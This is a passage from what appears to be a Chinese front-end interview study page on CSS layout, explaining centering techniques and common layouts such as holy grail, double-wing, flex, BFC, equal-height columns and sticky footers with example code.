href="https://vue3js.cn/interview/css/animation.html#%E4%B8%80%E3%80%81%E6%98%AF%E4%BB%80%E4%B9%88">https://vue3js.cn/interview/css/animation.html#%E4%B8%80%E3%80%81%E6%98%AF%E4%BB%80%E4%B9%88</a></p><p><a href="https://juejin.cn/post/6976121081841057800">https://juejin.cn/post/6976121081841057800</a></p><h1 id="CSS实现"><a href="#CSS实现" class="headerlink" title="CSS实现"></a>CSS实现</h1><h2 id="居中-div-原理？（高频）"><a href="#居中-div-原理？（高频）" class="headerlink" title="居中 div  原理？（高频）"></a>居中 div  原理？（高频）</h2><p><a href="https://liuyib.github.io/2020/04/07/css-h-and-v-center/">https://liuyib.github.io/2020/04/07/css-h-and-v-center/</a></p><h3 id="水平居中"><a href="#水平居中" class="headerlink" title="水平居中"></a>水平居中</h3><ol><li><p>给 div 设置一个宽度，然后添加 margin:0 auto 属性。</p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">div</span> &#123;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">200px</span>;</span><br><span class="line">  <span class="attribute">margin</span>: <span class="number">0</span> auto;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>绝对定位 + margin 反向偏移。</p></li><li><p>绝对定位，设置四个方向的值都为0，margin设为auto。</p><p>原理：由于宽高固定，因此对应方向平分，可以实现水平和垂直方向上的居中。</p></li><li><p>绝对定位 + calc。</p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.outer</span> &#123;</span><br><span class="line">  <span class="attribute">position</span>: relative;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.inner</span> &#123;</span><br><span class="line">  <span class="attribute">position</span>: absolute;</span><br><span class="line">  <span class="attribute">left</span>: <span class="built_in">calc</span>(<span class="number">50%</span> - <span class="number">50px</span>);</span><br><span class="line">  <span class="attribute">top</span>: <span class="built_in">calc</span>(<span class="number">50%</span> - <span class="number">50px</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>绝对定位 + transform反向偏移（<strong>解决子元素的宽高不确定问题</strong>）</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.content &#123;</span><br><span class="line">    width: 100px;</span><br><span class="line">    height: 100px;</span><br><span class="line">    background: pink;</span><br><span class="line">    position: absolute;</span><br><span class="line">    left: 50%;</span><br><span class="line">    transform: translateX(-50%);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>利用 text-align:center 实现。原理：<strong>text-align规定元素中的文本的水平对齐方式</strong>，将元素设置为 <code>inline-block</code>，该元素就会被当做文本对待，从而实现元素居中。</p><p>缺点：为了居中元素，使文本也居中了，因此可能需要重置文本位置。</p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.outer</span> &#123;</span><br><span class="line">  <span class="attribute">text-align</span>: center;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.inner</span> &#123;</span><br><span class="line">  <span class="attribute">display</span>: inline-block;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>flex 布局</p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.box</span> &#123;</span><br><span class="line">    <span class="attribute">display</span>: flex;</span><br><span class="line">    <span class="attribute">justify-content</span>: center; <span class="comment">/* 水平居中 */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>grid 布局。</p><p>缺点：比 flex 兼容性差。</p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.outer</span> &#123;</span><br><span class="line">  <span class="attribute">display</span>: grid;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.inner</span> &#123;</span><br><span class="line">  justify-self: center; <span class="comment">/* 水平居中 */</span></span><br><span class="line">  <span class="attribute">align-self</span>: center; <span class="comment">/* 垂直居中 */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h3 id="垂直居中"><a href="#垂直居中" class="headerlink" title="垂直居中"></a>垂直居中</h3><ol><li><p>如果是一行的行内元素，用 line-height 实现。原理：<strong>CSS 中“行距的上下等分机制”</strong></p></li><li><p>确定容器的宽高  宽500高300  设置层的外边距</p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">div</span>&#123;</span><br><span class="line"><span class="attribute">position</span>: absolute;<span class="comment">/*绝对定位*/</span></span><br><span class="line"><span class="attribute">width</span>: <span class="number">500px</span>;</span><br><span class="line"><span class="attribute">height</span>: <span class="number">300px</span>;</span><br><span class="line"><span class="attribute">top</span>: <span class="number">50%</span>;</span><br><span class="line"><span class="attribute">left</span>: <span class="number">50%</span>;</span><br><span class="line"><span class="attribute">margin</span>: -<span class="number">150px</span> <span class="number">0</span> <span class="number">0</span> -<span class="number">250px</span>;<span class="comment">/*外边距为自身宽高的一半*/</span></span><br><span class="line"><span class="attribute">background-color</span>: pink;<span class="comment">/*方便看效果*/</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>未知容器的宽高，利用<code>transform</code>属性</p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">div</span> &#123;</span><br><span class="line">  <span class="attribute">position</span>: absolute; <span class="comment">/*相对定位或绝对定位均可*/</span></span><br><span class="line">  <span class="attribute">width</span>: <span class="number">500px</span>;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">300px</span>;</span><br><span class="line">  <span class="attribute">top</span>: <span class="number">50%</span>;</span><br><span class="line">  <span class="attribute">left</span>: <span class="number">50%</span>;</span><br><span class="line">  <span class="attribute">transform</span>: <span class="built_in">translate</span>(-<span class="number">50%</span>, -<span class="number">50%</span>);</span><br><span class="line">  <span class="attribute">background-color</span>: pink; <span class="comment">/*方便看效果*/</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>利用 flex 布局 <strong>实际使用时应考虑兼容性</strong></p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.container</span> &#123;</span><br><span class="line">  <span class="attribute">display</span>: flex;</span><br><span class="line">  <span class="attribute">align-items</span>: center; <span class="comment">/*垂直居中*/</span></span><br><span class="line">  <span class="attribute">justify-content</span>: center; <span class="comment">/*水平居中*/</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>利用 line-height 和 vertical-align:middle 属性。原理：设置 inline-block，既能重置外部的 line-height 为正常大小，又能保持行内元素特性，从而可以设置 vertical-align 属性，以及产生“幽灵空白节点”（相当于在  .box 元素前面撑起了一个高度为 300px 的宽度为 0 的行内元素。）。</p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.container</span> &#123;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">300px</span>;</span><br><span class="line">  <span class="attribute">background-color</span>: <span class="number">#50ba8b</span>;</span><br><span class="line">  <span class="attribute">line-height</span>: <span class="number">300px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.box</span> &#123;</span><br><span class="line">  <span class="attribute">display</span>: inline-block;</span><br><span class="line">  <span class="attribute">background-color</span>: <span class="number">#5b4d4e</span>;</span><br><span class="line">  <span class="attribute">color</span>: <span class="number">#FFFFFF</span>;</span><br><span class="line">  <span class="attribute">line-height</span>: <span class="number">20px</span>;</span><br><span class="line">  <span class="attribute">margin</span>: <span class="number">0</span> <span class="number">20px</span>;</span><br><span class="line">  <span class="attribute">vertical-align</span>: middle;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h2 id="常见的-CSS-布局"><a href="#常见的-CSS-布局" class="headerlink" title="常见的 CSS 布局"></a>常见的 CSS 布局</h2><p>参考自<a href="https://juejin.cn/post/6844903710070407182#heading-12">几种常见的CSS布局</a></p><h3 id="单列布局"><a href="#单列布局" class="headerlink" title="单列布局"></a>单列布局</h3><p><img src="https://i.loli.net/2021/06/30/hilAODCQjrPyXUK.jpg" alt="Snipaste_2021-06-30_21-30-12.jpg"></p><p>常见的单列布局有两种：</p><ul><li>header，content 和 footer 等宽的单列布局</li><li>header 与 footer 等宽，content 略窄的单列布局</li></ul><p><strong>实现：</strong></p><ul><li>第一种，先通过对header,content,footer统一设置width(max-width):1000px(两者区别是当屏幕小于1000px时，前者会出现滚动条，后者则不会，显示出实际宽度)；然后设置margin:auto实现居中即可。</li><li>第二种，header、footer的内容宽度不设置，块级元素充满整个屏幕，但header、content和footer的内容区设置同一个width，并通过margin:auto实现居中。</li></ul><h3 id="两列自适应布局（高频）"><a href="#两列自适应布局（高频）" class="headerlink" title="两列自适应布局（高频）"></a>两列自适应布局（高频）</h3><p>两列自适应布局是指一列由内容撑开，另一列撑满剩余宽度的布局方式</p><p><strong>1.float+overflow:hidden</strong>：如果是普通的两列布局，<strong>浮动+普通元素的margin</strong>便可以实现，但如果是自适应的两列布局，利用 **float+overflow:hidden **便可以实现，这种办法主要通过 overflow 触发 BFC，而 BFC 不会重叠浮动元素：</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;parent&quot;</span> <span class="attr">style</span>=<span class="string">&quot;background-color: lightgrey;&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;left&quot;</span> <span class="attr">style</span>=<span class="string">&quot;background-color: lightblue;&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span>&gt;</span>left<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;right&quot;</span>  <span class="attr">style</span>=<span class="string">&quot;background-color: lightgreen;&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span>&gt;</span>right<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span>        </span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.parent</span> &#123;</span><br><span class="line">  <span class="attribute">overflow</span>: hidden;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.left</span> &#123;</span><br><span class="line">  <span class="attribute">float</span>: left;</span><br><span class="line">  <span class="attribute">margin-right</span>: <span class="number">20px</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.right</span> &#123;</span><br><span class="line">  <span class="attribute">overflow</span>: hidden;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>2.Flex布局</strong>：</p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.parent</span> &#123;</span><br><span class="line">  <span class="attribute">display</span>:flex;</span><br><span class="line">&#125;  </span><br><span class="line"><span class="selector-class">.right</span> &#123;</span><br><span class="line">  <span class="attribute">margin-left</span>:<span class="number">20px</span>; </span><br><span class="line">  <span class="attribute">flex</span>:<span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>3.grid布局</strong>：基于网格的二维布局系统，目的是用来优化用户界面设计。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.parent &#123;</span><br><span class="line">  display:grid;</span><br><span class="line">  grid-template-columns:auto 1fr;</span><br><span class="line">  grid-gap:20px</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><h3 id="三栏布局"><a href="#三栏布局" class="headerlink" title="三栏布局"></a>三栏布局</h3><p>特征：<strong>中间列自适应宽度，旁边两侧固定宽度</strong></p><h4 id="1-圣杯布局"><a href="#1-圣杯布局" class="headerlink" title="1.圣杯布局"></a>1.圣杯布局</h4><p> <strong>特点：</strong>dom 结构必须是先写中间列部分，这样实现中间列可以优先加载。</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">article</span> <span class="attr">class</span>=<span class="string">&quot;container&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;center&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>圣杯布局<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;left&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;right&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">article</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.container</span> &#123;</span><br><span class="line">  <span class="attribute">padding-left</span>: <span class="number">220px</span>;//为左右栏腾出空间</span><br><span class="line">  <span class="attribute">padding-right</span>: <span class="number">220px</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.left</span> &#123;</span><br><span class="line">  <span class="attribute">float</span>: left;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">200px</span>;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">400px</span>;</span><br><span class="line">  <span class="attribute">background</span>: red;</span><br><span class="line">  <span class="attribute">margin-left</span>: -<span class="number">100%</span>;</span><br><span class="line">  <span class="attribute">position</span>: relative;</span><br><span class="line">  <span class="attribute">left</span>: -<span class="number">220px</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.center</span> &#123;</span><br><span class="line">  <span class="attribute">float</span>: left;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">100%</span>;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">500px</span>;</span><br><span class="line">  <span class="attribute">background</span>: yellow;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.right</span> &#123;</span><br><span class="line">  <span class="attribute">float</span>: left;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">200px</span>;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">400px</span>;</span><br><span class="line">  <span class="attribute">background</span>: blue;</span><br><span class="line">  <span class="attribute">margin-left</span>: -<span class="number">200px</span>;</span><br><span class="line">  <span class="attribute">position</span>: relative;</span><br><span class="line">  <span class="attribute">right</span>: -<span class="number">220px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>实现步骤</strong></p><ul><li><p>三个部分都设定为左浮动，<strong>否则左右两边内容上不去，就不可能与中间列同一行</strong>。然后设置center的宽度为100%(<strong>实现中间列内容自适应</strong>)，此时left和right部分会跳到下一行</p></li><li><p>通过设置margin-left为负值让left和right部分回到与center部分同一行</p></li><li><p>通过设置父容器的padding-left和padding-right，让左右两边留出间隙。</p></li><li><p>通过设置相对定位，让left和right部分移动到两边。</p></li></ul><p><strong>缺点</strong></p><ul><li>center部分的最小宽度不能小于left部分的宽度，否则会left部分掉到下一行</li><li>如果其中一列内容高度拉长，其他两列的背景并不会自动填充。(借助等高布局正padding+负margin可解决)</li></ul><h4 id="2-双飞翼布局"><a href="#2-双飞翼布局" class="headerlink" title="2.双飞翼布局"></a>2.双飞翼布局</h4><p><strong>特点：</strong>在圣杯布局基础上进一步优化，解决了圣杯布局错乱问题，实现了内容与布局的分离。而且任何一栏都可以是最高栏，不会出问题。</p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.container</span> &#123;</span><br><span class="line">    <span class="attribute">min-width</span>: <span class="number">600px</span>;//确保中间内容可以显示出来，两倍<span class="attribute">left</span>宽+<span class="attribute">right</span>宽</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.left</span> &#123;</span><br><span class="line">    <span class="attribute">float</span>: left;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">200px</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">400px</span>;</span><br><span class="line">    <span class="attribute">background</span>: red;</span><br><span class="line">    <span class="attribute">margin-left</span>: -<span class="number">100%</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.center</span> &#123;</span><br><span class="line">    <span class="attribute">float</span>: left;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">100%</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">500px</span>;</span><br><span class="line">    <span class="attribute">background</span>: yellow;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.center</span> <span class="selector-class">.inner</span> &#123;</span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">0</span> <span class="number">200px</span>; //新增部分</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.right</span> &#123;</span><br><span class="line">    <span class="attribute">float</span>: left;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">200px</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">400px</span>;</span><br><span class="line">    <span class="attribute">background</span>: blue;</span><br><span class="line">    <span class="attribute">margin-left</span>: -<span class="number">200px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>实现步骤</strong></p><ul><li>三个部分都设定为左浮动，然后设置center的宽度为100%，此时，left和right部分会跳到下一行；</li><li>通过设置margin-left为负值让left和right部分回到与center部分同一行；</li><li>center部分增加一个内层div，并设margin: 0 200px；</li></ul><p><strong>缺点</strong></p><p>多加一层 dom 树节点，增加渲染树生成的计算量。</p><p><strong>两种布局方式的不同之处：</strong></p><ul><li> 圣杯布局利用父容器的左、右内边距+两个从列相对定位处理中间主列的位置</li><li> 双飞翼布局把主列嵌套在一个新的父级块中利用主列的左、右外边距进行布局调整</li></ul><h4 id="3-flex布局"><a href="#3-flex布局" class="headerlink" title="3.flex布局"></a>3.flex布局</h4><figure class="highlight css"><table><tr><td class="code"><pre><span class="line">&lt;style type=&quot;text/css&quot;&gt;</span><br><span class="line">    <span class="selector-class">.wrap</span> &#123;</span><br><span class="line">        <span class="attribute">display</span>: flex;</span><br><span class="line">        <span class="attribute">justify-content</span>: space-between;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="selector-class">.left</span>,</span><br><span class="line">    <span class="selector-class">.right</span>,</span><br><span class="line">    <span class="selector-class">.middle</span> &#123;</span><br><span class="line">        <span class="attribute">height</span>: <span class="number">100px</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="selector-class">.left</span> &#123;</span><br><span class="line">        <span class="attribute">width</span>: <span class="number">200px</span>;</span><br><span class="line">        <span class="attribute">background</span>: coral;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="selector-class">.right</span> &#123;</span><br><span class="line">        <span class="attribute">width</span>: <span class="number">120px</span>;</span><br><span class="line">        <span class="attribute">background</span>: lightblue;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="selector-class">.middle</span> &#123;</span><br><span class="line">        <span class="attribute">background</span>: <span class="number">#555</span>;</span><br><span class="line">        <span class="attribute">width</span>: <span class="number">100%</span>; </span><br><span class="line">        <span class="comment">/*flex: 1;*/</span></span><br><span class="line">        <span class="attribute">margin</span>: <span class="number">0</span> <span class="number">20px</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;<span class="selector-tag">div</span> class=&quot;wrap&quot;&gt;</span><br><span class="line">    &lt;<span class="selector-tag">div</span> class=&quot;<span class="attribute">left</span>&quot;&gt;左侧&lt;/<span class="selector-tag">div</span>&gt;</span><br><span class="line">    &lt;<span class="selector-tag">div</span> class=&quot;middle&quot;&gt;中间&lt;/<span class="selector-tag">div</span>&gt;</span><br><span class="line">    &lt;<span class="selector-tag">div</span> class=&quot;<span class="attribute">right</span>&quot;&gt;右侧&lt;/<span class="selector-tag">div</span>&gt;</span><br><span class="line">&lt;/<span class="selector-tag">div</span>&gt;</span><br></pre></td></tr></table></figure><p>实现过程：</p><ul><li>仅需将容器设置为<code>display:flex;</code>，</li><li>盒内元素两端对其，将中间元素设置为<code>100%</code>宽度，或者设为<code>flex:1</code>，即可填充空白</li><li>盒内元素的高度撑开容器的高度</li></ul><p>优点：</p><ul><li>结构简单直观</li><li>可以结合 flex 的其他功能实现更多效果，例如使用 order 属性调整显示顺序，让主体内容优先加载，但展示在中间</li></ul><h4 id="4-使用BFC"><a href="#4-使用BFC" class="headerlink" title="4.使用BFC"></a>4.使用BFC</h4><p>利用<code>BFC</code>区域不会与浮动元素重叠的特性实现三栏布局。</p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line">&lt;style type=&quot;text/css&quot;&gt;</span><br><span class="line">    <span class="selector-class">.container</span>&#123;</span><br><span class="line">        <span class="attribute">height</span>: <span class="number">200px</span>;</span><br><span class="line">        <span class="attribute">border</span>: <span class="number">1px</span> solid <span class="number">#eee</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="selector-class">.container</span> <span class="selector-tag">div</span>&#123;</span><br><span class="line">        <span class="attribute">color</span>: <span class="number">#fff</span>;</span><br><span class="line">        <span class="attribute">height</span>: <span class="number">100%</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="selector-class">.container</span> &gt; <span class="selector-class">.left</span>&#123;</span><br><span class="line">        <span class="attribute">float</span>: left;</span><br><span class="line">        <span class="attribute">width</span>: <span class="number">200px</span>;</span><br><span class="line">        <span class="attribute">background-color</span>: <span class="number">#19be6b</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="selector-class">.container</span> &gt; <span class="selector-class">.main</span>&#123;</span><br><span class="line">        <span class="attribute">display</span>: flex; <span class="comment">/*BFC触发*/</span></span><br><span class="line">        <span class="attribute">background-color</span>: <span class="number">#2979ff</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="selector-class">.container</span> &gt; <span class="selector-class">.right</span>&#123;</span><br><span class="line">        <span class="attribute">float</span>: right;</span><br><span class="line">        <span class="attribute">width</span>: <span class="number">200px</span>;</span><br><span class="line">        <span class="attribute">background-color</span>: <span class="number">#fa3534</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;<span class="selector-tag">div</span> class=&quot;container&quot;&gt;</span><br><span class="line">    &lt;<span class="selector-tag">div</span> class=&quot;<span class="attribute">left</span>&quot;&gt;<span class="attribute">left</span>&lt;/<span class="selector-tag">div</span>&gt;</span><br><span class="line">    &lt;<span class="selector-tag">div</span> class=&quot;<span class="attribute">right</span>&quot;&gt;<span class="attribute">right</span>&lt;/<span class="selector-tag">div</span>&gt;</span><br><span class="line">    &lt;<span class="selector-tag">div</span> class=&quot;<span class="selector-tag">main</span>&quot;&gt;<span class="selector-tag">main</span>&lt;/<span class="selector-tag">div</span>&gt;</span><br><span class="line">&lt;/<span class="selector-tag">div</span>&gt;</span><br></pre></td></tr></table></figure><h4 id="5-magin-等等"><a href="#5-magin-等等" class="headerlink" title="5.magin 等等"></a>5.magin 等等</h4><h3 id="等高布局"><a href="#等高布局" class="headerlink" title="等高布局"></a>等高布局</h3><p>等高布局是指子元素在父元素中高度相等的布局方式。常见几种实现方式：</p><p><strong>1.利用正padding+负margin</strong>：可解决圣杯布局的第二个缺点。因为背景是在 padding 区域显示的，设置一个大数值的 padding-bottom，再设置相同数值的负的 margin-bottom，并在所有列外面加上一个容器，并设置 overflow:hidden 把溢出背景切掉。新增代码如下：</p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.center</span>,</span><br><span class="line">   <span class="selector-class">.left</span>,</span><br><span class="line">   <span class="selector-class">.right</span> &#123;</span><br><span class="line">     <span class="attribute">padding-bottom</span>: <span class="number">10000px</span>;</span><br><span class="line">     <span class="attribute">margin-bottom</span>: -<span class="number">10000px</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="selector-class">.container</span> &#123;</span><br><span class="line">     <span class="attribute">padding-left</span>: <span class="number">220px</span>;</span><br><span class="line">     <span class="attribute">padding-right</span>: <span class="number">220px</span>;</span><br><span class="line">     <span class="attribute">overflow</span>: hidden;//把溢出背景切掉</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p><strong>2.利用背景图片</strong>：最早使用的一种方法，在列的父元素上使用背景图进行Y轴的铺放，从而实现一种等高列的假象。实现方法简单，兼容性强，不需要太多的css样式就可以轻松实现。但此方法不适合流体布局等高列的布局。</p><p><strong>3.模仿表格布局</strong>：非常简单，易于实现，不过兼容性不好，在 ie6-7 无法正常运行。</p><p><strong>4.使用边框和定位</strong>：实现一个假的高度相等列的效果。结构简单，兼容各浏览器，容易掌握。假设需要实现一个两列等高布局，侧栏高度要和主内容高度相等。</p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-id">#wrapper</span> &#123;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">960px</span>;</span><br><span class="line">  <span class="attribute">margin</span>: <span class="number">0</span> auto;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-id">#mainContent</span> &#123;</span><br><span class="line">  <span class="attribute">border-right</span>: <span class="number">220px</span> solid <span class="number">#dfdfdf</span>;</span><br><span class="line">  <span class="attribute">position</span>: absolute;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">740px</span>;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">800px</span>;  </span><br><span class="line">  <span class="attribute">background</span>: green;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-id">#sidebar</span> &#123;</span><br><span class="line">  <span class="attribute">background</span>: <span class="number">#dfdfdf</span>;</span><br><span class="line">  <span class="attribute">margin-left</span>: <span class="number">740px</span>;</span><br><span class="line">  <span class="attribute">position</span>: absolute;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">800px</span>;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">220px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="粘连布局"><a href="#粘连布局" class="headerlink" title="粘连布局"></a>粘连布局</h3><p><img src="https://i.loli.net/2021/06/30/q52LdVIhQDH67pw.jpg" alt="Snipaste_2021-06-30_21-50-14.jpg"></p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;wrap&quot;</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;main&quot;</span>&gt;</span></span><br><span class="line">       main <span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line">       main <span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line">       main <span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;footer&quot;</span>&gt;</span>footer<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-id">#wrap</span> &#123;</span><br><span class="line">  <span class="attribute">min-height</span>: <span class="number">100%</span>;</span><br><span class="line">  <span class="attribute">background</span>: pink;</span><br><span class="line">  <span class="attribute">text-align</span>: center;</span><br><span class="line">  <span class="attribute">overflow</span>: hidden;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-id">#wrap</span> <span class="selector-class">.main</span> &#123;</span><br><span class="line">  <span class="attribute">padding-bottom</span>: <span class="number">50px</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-id">#footer</span> &#123;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">50px</span>;</span><br><span class="line">  <span class="attribute">line-height</span>: <span class="number">50px</span>;</span><br><span class="line">  <span class="attribute">background</span>: deeppink;</span><br><span class="line">  <span class="attribute">text-align</span>: center;</span><br><span class="line">  <span class="attribute">margin-top</span>: -<span class="number">50px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>实现步骤:</strong></p><ol><li><p>footer必须是一个独立的结构，与wrap没有任何嵌套关系</p></li><li><p>wrap区域的高度通过设置min-height，变为视口高度</p></li><li><p>footer要使用margin为负来确定自己的位置</p></li><li><p>在main区域需要设置 padding-bottom。这也是为了防止负 margin 导致 footer 覆盖任何实际内容。</p></li></ol><h3 id="两边固定-中间自适应（todo）"><a href="#两边固定-中间自适应（todo）" class="headerlink" title="两边固定 中间自适应（todo）"></a>两边固定 中间自适应（todo）</h3><h3 id="五列等宽自适应（todo）"><a href="#五列等宽自适应（todo）" class="headerlink" title="五列等宽自适应（todo）"></a>五列等宽自适应（todo）</h3><h3 id="CSS-多列等高如何实现？"><a href="#CSS-多列等高如何实现？" class="headerlink" title="*CSS 多列等高如何实现？"></a>*CSS 